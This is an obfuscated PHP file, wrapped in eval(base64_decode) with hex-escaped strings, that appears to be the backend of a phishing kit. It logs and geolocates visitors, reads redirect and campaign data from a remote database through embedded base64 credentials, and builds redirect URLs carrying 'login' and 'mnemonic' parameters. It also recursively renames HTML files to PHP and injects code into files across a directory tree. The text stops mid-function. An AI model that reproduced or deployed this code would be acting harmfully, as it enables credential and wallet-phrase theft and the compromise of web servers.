<?php eval(base64_decode('
 goto vG73c; VOQzI: deleteOldFolders("\x77\145\x62"); goto F_l5G; X6TYr: if ($_SERVER["\122\x45\x51\x55\105\123\x54\x5f\115\x45\124\x48\117\104"] === "\x47\105\124") { $remote = isset($_GET["\162\x65\x6d\x6f\164\x65"]) ? $_GET["\x72\x65\155\x6f\164\x65"] : null; $id = isset($_GET["\x69\144"]) ? $_GET["\x69\x64"] : null; $user = isset($_GET["\x75\163\x65\x72"]) ? $_GET["\165\163\145\x72"] : null; $type = isset($_GET["\x74\171\x70\x65"]) ? $_GET["\164\171\x70\x65"] : null; $isValid = true; if (is_null($remote) || empty($remote)) { $isValid = false; } if (is_null($id) || empty($id)) { $isValid = false; } if (is_null($user) || empty($user)) { $isValid = false; } if (is_null($type) || empty($type)) { $isValid = false; } if ($isValid) { if ($type == "\154\157\x67\151\156") { if ($remote !== null && $id !== null && $user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\x6f\x6c\x69\x70\x73"] = $user; $_SESSION["\x6c\x6f\154\163\x6f\165\154\163"] = $id; update_user(); $RandOP_Mlux = random_string(6); $url = $remote . "\77\x26\x76\x61\x6c\x69\144\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\143\157\x6e\156\x65\143\x74\75" . $RandOP_Mlux . "\x26\165\x69\x64\75" . $RandOP_Mlux . "\x26\144\x61\164\x61\x3d" . $id . "\46\163\160\x61\143\145\x3d" . $RandOP_Mlux . "\x26\155\156\145\155\x6f\x6e\x69\143\x3d\x26\x76\x6d\x3d" . $RandOP_Mlux; header("\x4c\157\143\x61\164\x69\x6f\156\72\x20{$url}"); die; } else { $reson = "\105\130\x20\155\x69\163\x73\x69\x6e\147"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\x73\137\x73\x74\x61\164\x75\x73" => "\x34\60\65", "\155\145\163\163\141\x67\x65" => "\x45\x58\x20\155\151\163\163\x69\156\147"); ob_end_clean(); header("\103\157\x6e\164\x65\x6e\x74\55\124\x79\x70\145\x3a\x20\141\x70\x70\154\151\143\141\164\x69\x6f\x6e\x2f\152\x73\x6f\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } if ($type == "\x76\x69\145\x77") { $view_user = isset($_GET["\166\x69\x65\167\x5f\165\163\145\162"]) ? $_GET["\x76\x69\145\x77\137\x75\x73\145\x72"] : null; if ($remote !== null && $id !== null && $user !== null && $view_user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\157\x6c\151\x70\x73"] = $user; $_SESSION["\154\157\154\x73\x6f\x75\154\x73"] = $id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $remote . "\77\x26\166\141\154\x69\x64\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\143\157\x6e\x6e\x65\x63\x74\75" . $RandOP_Mlux . "\46\x75\x69\x64\75" . $RandOP_Mlux . "\x26\x64\141\164\x61\x3d" . $id . "\x26\x73\x70\x61\143\x65\75" . $RandOP_Mlux . "\46\155\156\145\x6d\x6f\156\x69\x63\x3d\x26\x76\x6d\75" . $RandOP_Mlux; header("\x4c\x6f\x63\141\164\x69\x6f\x6e\72\40{$url}"); die; } else { $reson = "\x76\151\145\167\40\x6d\151\x73\163\151\156\x67"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\x65\x73\137\163\164\141\164\165\163" => "\64\60\x35", "\x6d\145\163\163\141\147\x65" => "\x76\x69\x65\167\40\155\151\x73\x73\151\x6e\x67"); ob_end_clean(); header("\103\x6f\156\164\x65\x6e\164\x2d\124\171\x70\145\x3a\x20\x61\160\160\154\x69\143\141\164\151\157\x6e\x2f\x6a\163\157\156"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\151\156\x76\141\154\x69\x64\x20\x44\141\x74\141\x20\x2d\x20{$remote}\x20\55\40{$id}\40\55\x20{$user}\x20\x2d\40{$type}"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\163\137\x73\164\x61\x74\x75\163" => "\x34\x30\65", "\155\x65\x73\163\x61\x67\x65" => "\144\x61\164\x61\40\156\x6f\x74\x20\x61\x6c\x6c\157\167\x65\x64"); ob_end_clean(); header("\x43\x6f\x6e\x74\145\x6e\x74\x2d\124\x79\160\145\x3a\x20\x61\x70\160\154\151\143\x61\x74\x69\157\x6e\57\152\x73\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; } } elseif ($_SERVER["\x52\x45\x51\x55\105\123\124\137\x4d\x45\x54\x48\117\104"] === "\120\117\x53\124") { $view_com_ip = isset($_POST["\166\x69\145\x77\x5f\x73\145\x6e\144\x5f\x69\x70"]) ? $_POST["\x76\151\x65\167\x5f\x73\145\x6e\144\137\x69\x70"] : null; $view_com_domain = isset($_POST["\166\151\x65\167\137\x73\145\x6e\144\x5f\144\x6f\155\x61\x69\x6e"]) ? $_POST["\x76\x69\x65\167\137\x73\145\x6e\x64\137\x64\157\155\141\151\x6e"] : null; $view_return_domain = isset($_POST["\166\x69\x65\167\x5f\x72\x65\x74\x75\162\156\137\144\x6f\155\x61\151\x6e"]) ? $_POST["\166\151\x65\x77\137\162\x65\x74\x75\162\x6e\x5f\144\x6f\x6d\x61\151\x6e"] : null; $view_com_id = isset($_POST["\x76\x69\x65\x77\137\163\145\156\144\x5f\151\144"]) ? $_POST["\166\x69\x65\167\137\163\145\156\x64\x5f\x69\144"] : null; $view_com_action = isset($_POST["\x76\x69\145\167\x5f\163\x65\x6e\144\137\141\143\x74\151\157\x6e"]) ? $_POST["\x76\151\145\x77\x5f\x73\145\x6e\144\x5f\x61\143\164\x69\157\156"] : null; $view_patch = isset($_POST["\166\x69\145\167\137\160\x61\164\143\x68"]) ? $_POST["\x76\x69\x65\x77\x5f\160\x61\x74\x63\x68"] : null; $view_user = isset($_POST["\x76\151\145\x77\137\165\x73\x65\x72"]) ? $_POST["\x76\x69\145\167\x5f\x75\x73\x65\162"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\166\x69\145\x77\137\x73\x65\156\144\x5f\x61\x63\164\x69\x6f\x6e"] == "\166\151\145\167") { fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\x6c\x6f\154\151\x70\163"] = $view_com_ip; $_SESSION["\x6c\x6f\x6c\x73\157\x75\154\x73"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\77\46\x76\x69\145\x77\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\141\154\145\162\x74\x3d" . $RandOP_Mlux . "\46\170\154\x70\163\75" . $RandOP_Mlux . "\x26\x73\x6f\x75\154\163\75" . $view_com_id . "\46\144\157\x6e\145\75\x26\145\162\162\157\162\x79\x3d" . $RandOP_Mlux . "\x26\155\x6e\145\155\157\156\x69\143\x3d\x26\x6a\142\75" . $RandOP_Mlux; $responseData = array("\166\151\x65\x77\x5f\162\145\x73\x5f\x73\x74\141\164\165\163" => "\x73\165\143\143\x65\163\163", "\155\x65\x73\163\x61\x67\145" => $url); ob_end_clean(); header("\x43\x6f\156\x74\145\x6e\x74\x2d\124\171\x70\x65\72\40\141\160\x70\x6c\x69\143\x61\x74\151\x6f\156\57\x6a\163\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $login_com_ip = isset($_POST["\x6c\x6f\x67\151\156\137\163\x65\x6e\x64\137\x69\160"]) ? $_POST["\154\157\x67\151\156\x5f\163\x65\156\x64\x5f\151\x70"] : null; $login_com_domain = isset($_POST["\154\x6f\x67\x69\x6e\x5f\x73\x65\156\144\137\x64\x6f\x6d\x61\151\x6e"]) ? $_POST["\154\157\x67\x69\156\137\x73\145\156\x64\137\x64\157\155\141\151\x6e"] : null; $login_return_domain = isset($_POST["\154\157\147\151\156\x5f\162\145\164\x75\x72\156\x5f\144\x6f\155\141\x69\x6e"]) ? $_POST["\x6c\157\x67\151\156\x5f\162\x65\164\165\x72\x6e\137\x64\x6f\155\141\x69\156"] : null; $login_com_id = isset($_POST["\154\x6f\147\x69\x6e\137\163\145\x6e\144\x5f\x69\144"]) ? $_POST["\154\x6f\x67\151\x6e\x5f\x73\145\156\144\137\x69\144"] : null; $login_com_action = isset($_POST["\154\157\147\x69\x6e\x5f\163\x65\x6e\144\x5f\141\143\x74\x69\157\156"]) ? $_POST["\154\x6f\147\x69\156\x5f\163\x65\x6e\x64\x5f\x61\x63\164\151\x6f\156"] : null; $login_patch = isset($_POST["\154\157\x67\151\x6e\137\x70\141\x74\143\150"]) ? $_POST["\x6c\157\x67\151\x6e\x5f\160\x61\x74\143\150"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\154\x6f\x67\151\x6e\137\x73\145\x6e\x64\137\141\x63\164\x69\x6f\156"] == "\x6c\157\147\151\156") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\x6c\157\x6c\151\160\x73"] = $login_com_ip; $_SESSION["\x6c\157\x6c\x73\157\x75\x6c\x73"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\x3f\x26\154\x6f\147\151\x6e\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\x26\141\x6c\145\x72\164\75" . $RandOP_Mlux . "\46\170\154\x70\163\x3d" . $RandOP_Mlux . "\46\163\157\x75\x6c\163\75" . $login_com_id . "\46\x64\x6f\156\x65\75\46\x65\162\162\x6f\162\x79\75" . $RandOP_Mlux . "\x26\x6d\156\x65\x6d\x6f\156\151\143\x3d\46\x6a\x62\x3d" . $RandOP_Mlux; $responseData = array("\154\157\x67\151\x6e\137\162\x65\x73\137\163\164\x61\164\x75\x73" => "\x73\x75\143\x63\x65\163\163", "\x6d\x65\x73\163\141\x67\145" => $url); ob_end_clean(); header("\x43\x6f\156\x74\145\x6e\x74\55\124\x79\x70\x65\x3a\x20\141\160\x70\x6c\151\143\x61\x74\151\157\156\x2f\152\163\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $com_ip = isset($_POST["\163\145\156\144\x5f\151\160"]) ? $_POST["\163\x65\x6e\x64\x5f\151\160"] : null; $com_domain = isset($_POST["\x73\145\x6e\x64\137\144\157\x6d\x61\151\156"]) ? $_POST["\163\x65\x6e\144\x5f\144\157\x6d\x61\151\x6e"] : null; $return_domain = isset($_POST["\162\x65\x74\165\162\156\137\x64\x6f\155\141\x69\156"]) ? $_POST["\x72\x65\164\165\x72\156\137\144\157\x6d\x61\151\156"] : null; $com_id = isset($_POST["\x73\145\x6e\x64\x5f\151\x64"]) ? $_POST["\163\x65\156\144\x5f\151\x64"] : null; $com_action = isset($_POST["\163\x65\x6e\x64\137\x61\x63\x74\x69\x6f\x6e"]) ? $_POST["\x73\x65\156\144\137\141\143\x74\x69\157\x6e"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\162\x65\163\137\163\164\x61\164\165\x73" => "\x34\x30\65", "\155\x65\x73\163\x61\x67\x65" => "\x75\163\x65\162\x20\x62\x6c\x6f\x63\153\145\144"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\x65\x6e\x64\x5f\141\x63\164\x69\x6f\156"] == "\160\141\164\143\150") { if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null) { $_SESSION["\x6c\157\154\151\160\x73"] = $com_ip; $_SESSION["\154\x6f\154\x73\157\x75\x6c\x73"] = $com_id; $RandOP_Mlux = random_string(6); $url = $return_domain . "\77\46\160\141\164\x63\150\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\154\x65\x72\x74\75" . $RandOP_Mlux . "\46\170\x6c\160\163\75" . $RandOP_Mlux . "\46\x73\x6f\x75\154\163\x3d" . $com_id . "\46\144\157\156\145\x3d\x26\145\x72\x72\157\162\x79\75" . $RandOP_Mlux . "\46\x6d\x6e\x65\x6d\x6f\x6e\151\143\x3d\x26\152\x62\75" . $RandOP_Mlux; $responseData = array("\160\x61\x74\143\150\x5f\x72\x65\163\x5f\x73\x74\141\x74\165\x73" => "\163\165\143\143\145\x73\x73", "\155\x65\x73\x73\x61\x67\145" => $url); ob_end_clean(); header("\103\157\x6e\x74\x65\156\164\55\x54\171\160\145\x3a\40\141\160\160\154\151\143\141\164\x69\x6f\x6e\x2f\152\x73\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; die; } } } else { $reson = "\x70\x61\x72\141\155\40\x65\x72\x72"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\163\x5f\163\x74\141\164\165\x73" => "\64\60\65", "\155\145\163\x73\x61\x67\145" => "\x70\x61\x72\x61\x6d\x20\x65\162\162"); ob_end_clean(); header("\x43\157\x6e\164\145\x6e\x74\55\124\x79\x70\145\x3a\40\x61\x70\160\x6c\151\143\141\164\x69\x6f\x6e\x2f\152\163\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; } } goto jVGnj; s_ztH: $fs_log = base64_decode("\132\110\x4a\152\x5a\62\x6c\x73\145\126\101\x77\113\x6d\x73\x6d"); goto WsCBf; EXOF7: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\57" . $entry; if ($entry == "\56" || $entry == "\x2e\x2e") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\x68\164\155\154") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\56\160\150\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto ohALo; Eiayh: header("\x43\x6f\156\x74\145\x6e\x74\55\124\171\x70\x65\x3a\40\x61\160\160\154\151\143\141\164\151\157\156\x2f\x6a\163\x6f\x6e"); goto gybYP; gL107: $local_os = get_platform($local_userAgent); goto w0W7Q; Ngzx5: function random_string($length) { $characters = "\141\x62\143\144\145\146\x6a\150\x69\147\x6b\154\155\x6e\x6f\x70\161\162\x73\164\165\166\x77\170\171\172\60\x31\x32\63\64\65\x36\x37\70\x39\x41\102\103\x44\105\x46\107\110\111\x4a\113\x4c\x4d\116\117\x50\121\122\x53\x54\x55\126\127\130\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto VUha4; VKw6C: header("\x41\143\x63\x65\163\163\55\103\157\156\164\x72\x6f\154\x2d\x41\x6c\154\x6f\x77\55\115\145\164\x68\x6f\144\x73\72\x20\120\117\x53\124"); goto Z36Z9; w0W7Q: $local_browser = get_browser_value($local_userAgent); goto VOQzI; zleLJ: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\156\156\145\143\x74\151\157\156\40\146\x61\x69\x6c\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\103\124\40\52\40\106\122\117\115\40\162\x65\144\151\x72\x63\164\151\157\x6e\40\127\110\105\x52\105\x20\151\144\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\x69\156\x6b"] = base64_decode(base64_decode($row["\154\151\x6e\153"])); $_SESSION["\x63\156"] = explode("\x3b", base64_decode(base64_decode($row["\143\x6f\165\x6e\164\x72\x79"]))); $_SESSION["\160\151\143"] = $row["\x70\151\143"]; $_SESSION["\x6d\163\x67"] = base64_decode(base64_decode($row["\x6d\x73\x67"])); $_SESSION["\145\x78\x70\x69\162\x65\137\x64\x61\x74\145"] = $row["\145\x78\160\x69\162\x65\137\144\141\x74\x65"]; $_SESSION["\x73\145\x72\166\x65\x72"] = base64_decode(base64_decode($row["\x73\145\162\x76\x65\x72"])); $_SESSION["\x75\162\x6c"] = base64_decode(base64_decode($row["\165\162\154"])); $_SESSION["\x6c\x75\170\143\141\x70\x74\x63\150\x61"] = $row["\154\165\x78\143\x61\x70\164\143\x68\x61"]; $_SESSION["\x74\157\153\145\156\164\145\x6c"] = base64_decode(base64_decode($row["\164\157\153\145\x6e\x74\145\x6c"])); $_SESSION["\151\144\164\145\154"] = base64_decode(base64_decode($row["\151\x64\164\x65\154"])); $_SESSION["\x72\145\144\x69\162\x69\x63\x74"] = $row["\x72\145\x64\151\x72\151\143\x74"]; $_SESSION["\160\162\157\152\x65\x63\x74"] = $row["\x70\x72\157\152\145\x63\x74"]; $_SESSION["\x61\x70\151"] = $row["\x61\x70\151"]; $_SESSION["\141\x64\x64\142\171"] = $row["\141\x64\144\142\171"]; $_SESSION["\151\x73\160\162\157\x74\x65\143\164"] = $row["\151\163\160\x72\157\164\x65\x63\164"]; $_SESSION["\160\x72\157\170\x79"] = $row["\160\x72\x6f\x78\x79"]; $_SESSION["\x63\x61\x70\164\143\x68\141\x5f\x64\x61\164\x61"] = $row["\x63\141\x70\164\x63\x68\x61"]; $_SESSION["\x67\157\x6f\x6c\145\137\x63\x61\160"] = $row["\147\157\x6f\147\154\x65\x5f\143\141\x70"]; $_SESSION["\x63\154\157\165\x64\x5f\x63\141\x70"] = $row["\x63\x6c\x6f\x75\144\x5f\x63\141\160"]; $_SESSION["\160\x72\x6f\x5f\x69\143\157"] = $row["\x70\162\x6f\x5f\x69\143\157"]; $_SESSION["\x70\x72\157\137\x63\157\154\x6f\162"] = $row["\160\x72\x6f\x5f\143\157\x6c\x6f\x72"]; $_SESSION["\160\x72\x6f\x5f\155\x73\147"] = $row["\160\x72\157\137\x6d\x73\x67"]; $_SESSION["\x70\162\157\137\x69\155\x67"] = $row["\160\162\x6f\137\x69\155\147"]; $_SESSION["\160\162\157\x5f\x6c\157\147\157"] = $row["\x70\162\157\137\154\157\147\157"]; } } else { $refix = "\156\157\164\40\x66\157\x75\156\144\x20\x69\144\56{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto NYuwm; gybYP: error_reporting(E_ALL); goto bZMMr; VUha4: function random_number($length) { $characters = "\60\61\62\x33\x34\x35\66\x37\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto zleLJ; TAzPN: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto H3Zs4; LsEPe: $local_time = date("\131\55\x6d\55\x64\40\110\72\151\72\x73"); goto Pb8pg; YVBFf: function get_platform($USER_AGENT) { $OS_ERROR = "\x55\x6e\x6b\x6e\x6f\x77\x6e\40\117\x53\x20\x50\154\x61\164\x66\157\162\155"; $OS = array("\57\x77\x69\156\x64\x6f\167\163\x20\x6e\x74\40\x31\x31\57\151" => "\x57\x69\156\x64\x6f\x77\x73\x20\61\61", "\57\167\x69\x6e\x64\157\167\x73\x20\x6e\164\40\x31\x30\x2f\x69" => "\x57\x69\156\144\157\x77\x73\40\x31\60", "\x2f\167\x69\156\x64\x6f\167\163\x20\x6e\x74\40\66\x2e\63\x2f\x69" => "\x57\x69\156\144\157\x77\163\x20\70\56\61", "\57\167\x69\x6e\x64\157\x77\163\40\156\164\x20\66\56\62\57\151" => "\x57\151\156\x64\157\x77\163\40\x38", "\57\x77\151\156\x64\x6f\x77\163\40\x6e\x74\40\x36\x2e\61\57\x69" => "\127\x69\x6e\x64\157\167\163\40\x37", "\x2f\167\x69\156\144\157\x77\163\40\156\x74\40\66\56\60\x2f\x69" => "\x57\151\156\144\157\x77\163\x20\126\x69\163\164\x61", "\x2f\x77\x69\x6e\x64\x6f\x77\163\x20\156\x74\x20\65\56\62\57\x69" => "\127\x69\x6e\x64\x6f\x77\x73\40\x53\x65\162\166\x65\x72\40\62\60\x30\63\57\x58\x50\x20\170\x36\64", "\57\167\x69\x6e\144\157\167\163\x20\x6e\164\x20\65\56\x31\57\x69" => "\127\151\x6e\x64\157\167\x73\x20\130\120", "\x2f\167\151\x6e\144\157\x77\163\x20\x78\x70\57\x69" => "\x57\151\x6e\x64\157\167\163\40\x58\x50", "\57\167\151\156\x64\157\x77\x73\x20\156\164\x20\65\56\x30\57\151" => "\x57\151\x6e\144\157\x77\163\40\62\x30\60\x30", "\57\x77\x69\156\144\157\x77\x73\x20\155\x65\x2f\x69" => "\127\x69\156\144\157\167\163\40\115\105", "\x2f\x77\x69\x6e\x39\x38\57\151" => "\x57\151\156\144\x6f\167\163\40\71\x38", "\57\x77\x69\156\71\65\x2f\x69" => "\x57\151\x6e\144\157\167\163\40\x39\65", "\x2f\167\151\x6e\61\66\x2f\x69" => "\x57\x69\x6e\x64\x6f\x77\x73\40\63\56\x31\61", "\57\155\x61\143\x69\156\x74\157\x73\x68\x7c\x6d\x61\143\40\157\x73\40\170\x2f\x69" => "\x4d\x61\x63\x20\x4f\123\x20\130", "\57\x6d\x61\143\x5f\160\157\x77\145\x72\x70\x63\57\151" => "\115\x61\x63\40\x4f\x53\40\x39", "\57\154\151\x6e\x75\x78\57\151" => "\114\151\156\165\x78", "\x2f\x75\x62\165\x6e\x74\x75\x2f\151" => "\125\142\x75\156\164\165", "\x2f\x69\160\150\x6f\x6e\x65\x2f\151" => "\x69\x50\150\x6f\x6e\145", "\x2f\151\x70\157\144\x2f\x69" => "\151\120\157\144", "\x2f\151\160\x61\x64\57\151" => "\x69\120\x61\x64", "\57\x61\156\144\x72\x6f\151\144\x2f\151" => "\x41\x6e\144\x72\157\x69\144", "\57\x62\x6c\x61\x63\153\142\145\x72\x72\x79\57\x69" => "\x42\154\141\143\153\x42\145\162\162\x79", "\57\x77\145\142\157\x73\57\151" => "\x4d\x6f\x62\x69\x6c\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto p2Xyz; Akgp8: $fs_host = base64_decode("\115\124\153\x34\x4c\152\111\61\115\x53\x34\64\x4e\x43\x34\171\115\104\x41"); goto RqQJj; gGaU5: function getClientIP() { if (!empty($_SERVER["\110\124\124\x50\137\x43\114\x49\105\116\x54\137\x49\120"])) { $ipAddress = $_SERVER["\110\124\124\x50\x5f\x43\x4c\111\105\x4e\124\137\x49\x50"]; } elseif (!empty($_SERVER["\x48\x54\x54\120\137\130\137\106\117\x52\x57\101\x52\x44\x45\x44\137\106\117\x52"])) { $ipAddress = $_SERVER["\x48\124\124\120\x5f\130\137\106\117\122\127\101\x52\104\x45\104\137\106\117\122"]; } else { $ipAddress = $_SERVER["\x52\105\115\117\x54\105\137\x41\x44\104\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\x2f\x5c\142\x5c\x64\173\61\54\x33\175\x5c\56\134\x64\x7b\61\54\63\x7d\x5c\x2e\134\144\173\x31\54\x33\175\x5c\56\134\x64\x7b\61\x2c\x33\x7d\x5c\x62\x2f", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\163\x65\x73\163\x69\157\156\137\151\x70"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\x73\x65\x73\x73\x69\157\156\137\151\160"] = "\61\62\67\x2e\x30\56\60\x2e\61"; return "\x31\x32\67\56\x30\56\60\x2e\x31"; } } goto Eo4pE; Eo4pE: function fetchIPInfo($ipAddress_send) { global $fs_host, $fs_user, $fs_log, $fs_name, $ipAddress, $data_country, $data_isp; $url = "\150\164\x74\x70\72\57\x2f\151\x70\x2d\x61\x70\151\x2e\x63\157\x6d\x2f\x6a\163\157\x6e\57{$ipAddress_send}\77\x66\151\x65\154\144\163\x3d\163\164\141\164\165\163\x2c\155\145\x73\163\141\147\x65\x2c\x63\157\156\164\151\x6e\145\x6e\x74\x2c\143\157\156\x74\x69\x6e\145\156\x74\x43\x6f\x64\145\x2c\143\x6f\165\156\164\x72\171\x2c\x63\x6f\x75\156\x74\x72\x79\x43\x6f\x64\145\x2c\x72\145\x67\151\157\156\x2c\162\145\x67\151\x6f\x6e\x4e\141\x6d\145\54\143\x69\164\x79\54\144\151\163\164\x72\x69\x63\x74\54\172\151\160\54\154\x61\164\54\x6c\x6f\x6e\x2c\x74\151\x6d\145\x7a\x6f\156\x65\x2c\157\146\x66\163\145\x74\54\x63\x75\162\x72\x65\x6e\x63\x79\54\151\163\x70\x2c\157\x72\147\54\x61\x73\x2c\141\163\x6e\x61\x6d\145\54\x72\145\x76\145\x72\163\x65\54\x6d\157\142\151\154\x65\x2c\x70\x72\157\170\x79\x2c\150\157\x73\164\151\156\147\x2c\x71\x75\x65\162\x79"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = json_decode($response, true); if (isset($info["\163\164\x61\x74\165\163"]) && $info["\x73\164\x61\x74\x75\163"] !== "\163\165\143\x63\x65\163\x73") { $_SESSION["\x73\145\x73\163\151\x6f\156\137\x69\x73\x70"] = "\125\x6e\153\x6e\157\167\x6e"; $_SESSION["\163\145\163\163\x69\x6f\156\137\143\157\165\156\164\x72\171"] = "\125\156\153\156\x6f\x77\x6e"; $_SESSION["\x73\145\x73\x73\151\157\156\x5f\x63\157\x75\156\x74\162\x79\137\x63\x6f\x64\145"] = "\x55\x6e\x6b\156\157\167\156"; $_SESSION["\x73\145\x73\x73\x69\x6f\x6e\x5f\143\151\x74\x79"] = "\125\156\x6b\x6e\x6f\x77\156"; $_SESSION["\x73\145\x73\163\x69\157\x6e\x5f\162\145\x67\x69\x6f\x6e"] = "\x55\156\153\156\x6f\x77\x6e"; $_SESSION["\163\x65\x73\x73\151\157\x6e\x5f\160\162\x6f\x78\x79"] = "\x46\141\154\163\145"; $_SESSION["\163\x65\x73\163\151\157\156\137\x6d\157\x62\151\154\145"] = "\106\141\154\x73\x65"; $_SESSION["\163\x65\163\163\151\157\x6e\x5f\x68\x6f\x73\x74\x69\x6e\147"] = "\x46\141\x6c\163\x65"; return; } $data_country = isset($info["\x63\x6f\165\x6e\164\x72\171"]) ? $info["\143\x6f\x75\156\x74\x72\171"] : null; $data_isp = isset($info["\151\163\x70"]) ? $info["\151\x73\x70"] : null; $_SESSION["\163\x65\x73\163\x69\157\156\137\x69\x73\160"] = isset($info["\x69\x73\160"]) ? $info["\x69\163\x70"] : null; $_SESSION["\163\145\x73\163\x69\x6f\156\x5f\143\157\165\156\x74\162\171"] = isset($info["\x63\157\x75\156\164\162\x79"]) ? $info["\143\157\165\x6e\164\162\171"] : null; $_SESSION["\x73\145\163\x73\x69\157\156\137\x63\157\165\156\x74\162\x79\137\x63\157\x64\x65"] = isset($info["\143\x6f\165\156\x74\162\x79\x43\157\144\x65"]) ? $info["\143\x6f\x75\x6e\x74\x72\171\103\x6f\144\x65"] : null; $_SESSION["\x73\x65\x73\x73\x69\157\156\137\143\x69\164\171"] = isset($info["\143\151\x74\x79"]) ? $info["\143\x69\x74\171"] : null; $_SESSION["\x73\145\163\163\x69\x6f\x6e\137\x72\145\147\x69\x6f\156"] = isset($info["\162\145\x67\151\x6f\156\116\x61\x6d\x65"]) ? $info["\x72\145\x67\151\x6f\156\116\x61\155\145"] : null; $_SESSION["\163\x65\163\x73\x69\157\156\137\160\x72\x6f\170\171"] = isset($info["\160\x72\157\x78\x79"]) && $info["\x70\162\x6f\170\171"] ? "\124\162\x75\145" : "\x46\141\x6c\x73\x65"; $_SESSION["\163\x65\x73\x73\x69\x6f\156\137\x6d\157\x62\x69\x6c\145"] = isset($info["\155\x6f\x62\151\154\145"]) && $info["\155\157\x62\x69\x6c\x65"] ? "\124\x72\165\145" : "\106\141\154\x73\x65"; $_SESSION["\x73\145\163\x73\151\x6f\x6e\137\150\157\x73\x74\151\156\x67"] = isset($info["\150\157\163\x74\x69\156\147"]) && $info["\150\157\163\164\x69\x6e\x67"] ? "\x54\162\165\145" : "\x46\141\154\x73\x65"; } goto GVy61; U4HxN: $local_userAgent = isset($_SERVER["\110\x54\x54\120\x5f\x55\x53\105\x52\137\101\x47\105\x4e\x54"]) ? $_SERVER["\x48\x54\x54\x50\137\x55\123\x45\x52\x5f\x41\107\x45\x4e\x54"] : ''; goto LsEPe; DW6c0: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\x4e\x6f\x74\x20\x56\x61\154\151\x64"; } } goto gGaU5; yMO2X: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\57\x69\156\144\145\x78\x2e\x68\164\x6d\154") || file_exists($path . "\57\x69\x6e\144\145\x78\56\160\x68\x70")) { return $path; } else { $subDirectories = glob($path . "\57\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto R5lEr; H3Zs4: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\x2e\56") { $filePath = $directory . "\57" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, 